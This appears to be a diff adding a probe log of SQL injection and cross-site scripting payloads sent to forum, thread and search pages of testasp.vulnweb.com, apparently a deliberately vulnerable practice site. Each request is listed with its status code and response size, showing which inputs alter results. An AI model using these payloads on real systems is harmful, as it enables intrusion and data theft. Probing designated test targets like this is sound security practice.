@@ -1,0 +1,132 @@
+==========================================================================================
+### A. /showforum.asp?id=<payload>
+
+--- baseline id=1
+    URL : http://testasp.vulnweb.com/showforum.asp?id=1
+    HTTP: HTTP/1.1 200 OK  len=3262  sha=44cdcf813125  vs-baseline=
+
+--- id=1'
+    URL : http://testasp.vulnweb.com/showforum.asp?id=1%27
+    HTTP: HTTP/1.1 500 Internal Server Error  len=1433  sha=b8312bf5e7d3  vs-baseline=DIFF(-1829B)
+
+--- id=1''
+    URL : http://testasp.vulnweb.com/showforum.asp?id=1%27%27
+    HTTP: HTTP/1.1 500 Internal Server Error  len=1433  sha=0af2938e5e05  vs-baseline=DIFF(-1829B)
+
+--- id=1'--
+    URL : http://testasp.vulnweb.com/showforum.asp?id=1%27--
+    HTTP: HTTP/1.1 500 Internal Server Error  len=1433  sha=706cb8b4ab25  vs-baseline=DIFF(-1829B)
+
+--- id=1 AND 1=1
+    URL : http://testasp.vulnweb.com/showforum.asp?id=1%20AND%201%3D1
+    HTTP: HTTP/1.1 200 OK  len=3302  sha=6967b3b6f9f2  vs-baseline=DIFF(+40B)
+
+--- id=1 AND 1=2
+    URL : http://testasp.vulnweb.com/showforum.asp?id=1%20AND%201%3D2
+    HTTP: HTTP/1.1 500 Internal Server Error  len=1433  sha=da545b7155d7  vs-baseline=DIFF(-1829B)
+
+--- id=1 OR 1=1
+    URL : http://testasp.vulnweb.com/showforum.asp?id=1%20OR%201%3D1
+    HTTP: HTTP/1.1 200 OK  len=4145  sha=a1cfdb0e3a64  vs-baseline=DIFF(+883B)
+
+--- id=abc
+    URL : http://testasp.vulnweb.com/showforum.asp?id=abc
+    HTTP: HTTP/1.1 500 Internal Server Error  len=1433  sha=66fcab56cf11  vs-baseline=DIFF(-1829B)
+
+--- id=-1
+    URL : http://testasp.vulnweb.com/showforum.asp?id=-1
+    HTTP: HTTP/1.1 500 Internal Server Error  len=1433  sha=4ae50bc4095b  vs-baseline=DIFF(-1829B)
+
+--- id=1;--
+    URL : http://testasp.vulnweb.com/showforum.asp?id=1%3B--
+    HTTP: HTTP/1.1 200 OK  len=3284  sha=61daa8bc6f14  vs-baseline=DIFF(+22B)
+
+--- id=0 OR 1=1
+    URL : http://testasp.vulnweb.com/showforum.asp?id=0%20OR%201%3D1
+    HTTP: HTTP/1.1 200 OK  len=4145  sha=bfb18de72d11  vs-baseline=DIFF(+883B)
+
+--- id=1 UNION SELECT 1
+    URL : http://testasp.vulnweb.com/showforum.asp?id=1%20UNION%20SELECT%201
+    HTTP: HTTP/1.1 500 Internal Server Error  len=1433  sha=665c01c96bb1  vs-baseline=DIFF(-1829B)
+
+--- id=1'+OR+'1'='1
+    URL : http://testasp.vulnweb.com/showforum.asp?id=1%27%2BOR%2B%271%27%3D%271
+    HTTP: HTTP/1.1 500 Internal Server Error  len=1433  sha=6428faba805b  vs-baseline=DIFF(-1829B)
+
+==========================================================================================
+### B. /showthread.asp?id=<payload>
+
+--- baseline id=0
+    URL : http://testasp.vulnweb.com/showthread.asp?id=0
+    HTTP: HTTP/1.1 200 OK  len=3221  sha=b23ef37611a1  vs-baseline=
+
+--- id=0'
+    URL : http://testasp.vulnweb.com/showthread.asp?id=0%27
+    HTTP: HTTP/1.1 500 Internal Server Error  len=1433  sha=89272489aebf  vs-baseline=DIFF(-1788B)
+
+--- id=0''
+    URL : http://testasp.vulnweb.com/showthread.asp?id=0%27%27
+    HTTP: HTTP/1.1 500 Internal Server Error  len=1433  sha=99a785056d46  vs-baseline=DIFF(-1788B)
+
+--- id=0'--
+    URL : http://testasp.vulnweb.com/showthread.asp?id=0%27--
+    HTTP: HTTP/1.1 500 Internal Server Error  len=1433  sha=2ab106dac6d8  vs-baseline=DIFF(-1788B)
+
+--- id=0 AND 1=1
+    URL : http://testasp.vulnweb.com/showthread.asp?id=0%20AND%201%3D1
+    HTTP: HTTP/1.1 200 OK  len=3261  sha=d112eda48ccd  vs-baseline=DIFF(+40B)
+
+--- id=0 AND 1=2
+    URL : http://testasp.vulnweb.com/showthread.asp?id=0%20AND%201%3D2
+    HTTP: HTTP/1.1 500 Internal Server Error  len=1433  sha=51d6c17f8d22  vs-baseline=DIFF(-1788B)
+
+--- id=abc
+    URL : http://testasp.vulnweb.com/showthread.asp?id=abc
+    HTTP: HTTP/1.1 500 Internal Server Error  len=1433  sha=dd5466638619  vs-baseline=DIFF(-1788B)
+
+--- id=-1
+    URL : http://testasp.vulnweb.com/showthread.asp?id=-1
+    HTTP: HTTP/1.1 500 Internal Server Error  len=1433  sha=45b2bb11e600  vs-baseline=DIFF(-1788B)
+
+--- id=0 OR 1=1
+    URL : http://testasp.vulnweb.com/showthread.asp?id=0%20OR%201%3D1
+    HTTP: HTTP/1.1 200 OK  len=2330686  sha=6bbe6bb5193d  vs-baseline=DIFF(+2327465B)
+
+==========================================================================================
+### C. /Search.asp?tfSearch=<payload>
+
+--- baseline tfSearch=weather
+    URL : http://testasp.vulnweb.com/Search.asp?tfSearch=weather
+    HTTP: HTTP/1.1 200 OK  len=3165  sha=360dd3559cd6  vs-baseline=
+
+--- tfSearch='
+    URL : http://testasp.vulnweb.com/Search.asp?tfSearch=%27
+    HTTP: HTTP/1.1 200 OK  len=3155  sha=bca35c22d487  vs-baseline=DIFF(-10B)
+
+--- tfSearch=''
+    URL : http://testasp.vulnweb.com/Search.asp?tfSearch=%27%27
+    HTTP: HTTP/1.1 200 OK  len=3166  sha=92d2bb0bba82  vs-baseline=DIFF(+1B)
+
+--- tfSearch=a'--
+    URL : http://testasp.vulnweb.com/Search.asp?tfSearch=a%27--
+    HTTP: HTTP/1.1 500 Internal Server Error  len=1433  sha=e79819d62422  vs-baseline=DIFF(-1732B)
+
+--- tfSearch=search' OR '1'='1
+    URL : http://testasp.vulnweb.com/Search.asp?tfSearch=search%27%20OR%20%271%27%3D%271
+    HTTP: HTTP/1.1 500 Internal Server Error  len=1433  sha=b18b67db6fd8  vs-baseline=DIFF(-1732B)
+
+--- tfSearch=0 OR 1=1
+    URL : http://testasp.vulnweb.com/Search.asp?tfSearch=0%20OR%201%3D1
+    HTTP: HTTP/1.1 200 OK  len=3955  sha=003e4e7d5ad3  vs-baseline=DIFF(+790B)
+
+--- tfSearch=<b>x</b>
+    URL : http://testasp.vulnweb.com/Search.asp?tfSearch=%3Cb%3Ex%3C/b%3E
+    HTTP: HTTP/1.1 200 OK  len=3204  sha=39812082ca8b  vs-baseline=DIFF(+39B)
+
+--- tfSearch=<script>alert(1)</script>
+    URL : http://testasp.vulnweb.com/Search.asp?tfSearch=%3Cscript%3Ealert%281%29%3C/script%3E
+    HTTP: HTTP/1.1 200 OK  len=4034  sha=8aa4239bf591  vs-baseline=DIFF(+869B)
+
+--- tfSearch="><img src=x onerror=alert(1)>
+    URL : http://testasp.vulnweb.com/Search.asp?tfSearch=%22%3E%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E
+    HTTP: HTTP/1.1 200 OK  len=4077  sha=b0fd9ee2711e  vs-baseline=DIFF(+912B)
